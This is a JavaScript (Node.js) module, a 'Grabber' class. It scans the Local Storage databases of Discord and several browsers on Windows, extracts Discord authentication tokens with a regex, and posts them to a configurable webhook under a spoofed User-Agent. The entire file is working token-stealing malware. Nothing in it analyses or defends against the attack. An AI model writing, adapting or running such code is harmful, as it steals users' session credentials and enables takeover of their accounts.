const { readdirSync, readFileSync, existsSync } = require('fs');
const https = require('https');

class Grabber {
	constructor({ WEBHOOK_URL, ping } = {}) {
		this.WEBHOOK_URL = WEBHOOK_URL || '';
		this.ping = ping ?? true;
		this.regex = new RegExp("\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"", 'g');
	}

	findTokens(path) {
		path += '\\Local Storage\\leveldb';
		const tokens = [];

		for (const file of readdirSync(path)) {
			if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;

			const file_buffer = readFileSync(`${path}\\${file}`).toString('utf-8');
			if (!file_buffer) continue;

			const matches = file_buffer.match(this.regex);
			if (!matches) continue;

			tokens.push(...matches);
		}

		return tokens;
	}

	guruji() {
		const local = process.env.LOCALAPPDATA;
		const roaming = process.env.APPDATA;

		const paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
		}

		let message = this.ping ? '@everyone' : '';
		const data = [];

		for (const [platform, path] of Object.entries(paths)) {
			if (!existsSync(path)) continue;

			data.push({
				msg: `\n**Platform:** ${platform}`,
				tokens: `${this.findTokens(path).map(m => `\`\`\`js\n${m}\`\`\``).join('\n')}`
			});

			if (data.length) {
				message += `${data.map(m => `${m.msg}\n${m.tokens}`)}`
			} else {
				message += 'No tokens found.\n';
			}
		}

		this.post(this.WEBHOOK_URL, message);

	}

	post(url, message) {
		const { hostname, pathname: path } = new URL(url);

		const data = JSON.stringify({
			content: message
		});

		const options = {
			hostname,
			path,
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'Content-Length': data.length,
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
			}
		}

		const req = https.request(options);

		req.on('error', error => {
			console.error(error)
		});

		req.write(data);
		req.end();
	}
}

module.exports = Grabber;